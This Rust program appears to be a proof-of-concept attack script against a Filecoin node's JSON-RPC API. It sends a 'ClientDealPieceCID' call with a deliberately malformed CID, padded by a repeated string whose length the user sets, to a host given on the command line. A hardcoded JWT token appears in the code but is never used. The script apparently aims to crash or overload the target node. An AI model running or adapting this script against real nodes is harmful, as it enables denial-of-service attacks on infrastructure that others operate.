use clap::{arg, command};
use hyper::body::Bytes;
use hyper::Request;
use hyper_util::rt::TokioIo;
use serde_json::json;
use std::process::Command as C;
use std::str::FromStr;
use tokio::net::TcpStream;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // This is where we will setup our HTTP client requests.
    //Arguments
    let matches = command!()
        .arg(arg!([url]"url"))
        .arg(arg!(--num <i32> "num"))
        .arg(arg!(--m <String> "method"))
        .arg(arg!(--p <String> "params"))
        .get_matches();

    // Rpc

    let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBbGxvdyI6WyJyZWFkIl19.pQRB0b-GRz3OifFUwf9ew5HcDG3QgNSbp8hk50h9aGQ";

    let mut bytes = "a".to_string();
    if let Some(count) = matches.get_one::<String>("num") {
        let range = count.parse::<i32>().unwrap();
        for _ in 0..range.clone() {
            bytes.insert_str(1, "Asss");
        }
    };

    let rpc = json!({
        "jsonrpc":"2.0",
        "id":2,
        "method":"Filecoin.ClientDealPieceCID",
        "params":[{"/": "bafy2bzacea3wsdh6y3a36tb3skempjoxqpuyompjbmfeyf34fi3uy6uue42sdsdsdsdsds".to_owned() + &bytes}]
    });


    // Action
    if let Some(url) = matches.get_one::<String>("url") {
        let req = Request::builder()
            .uri("http://127.0.0.1:1234/")
            .header(hyper::header::CONTENT_TYPE, "application/json")
            .body(rpc.clone().to_string())?;
        println!("{:?}", req);
        // Open a TCP connection to the remote host
        let address = format!("{}:{}", url, 1234);
        let stream = TcpStream::connect(address).await?;

        // Use an adapter to access something implementing `tokio::io` traits as if they implement
        // `hyper::rt` IO traits.
        let io = TokioIo::new(stream);

        // Perform a TCP handshake
        let (mut sender, conn) = hyper::client::conn::http1::handshake(io).await?;

        // Spawn a task to poll the connection, driving the HTTP state
        tokio::task::spawn(async move {
            if let Err(err) = conn.await {
                println!("Connection failed: {:?}", err);
            }
        });
       
        // Await the response...
        let mut res = sender.send_request(req.clone()).await?;

        println!("Response status: {}", res.status());
        println!("{:?}", req.clone());

    }
    Ok(())
}
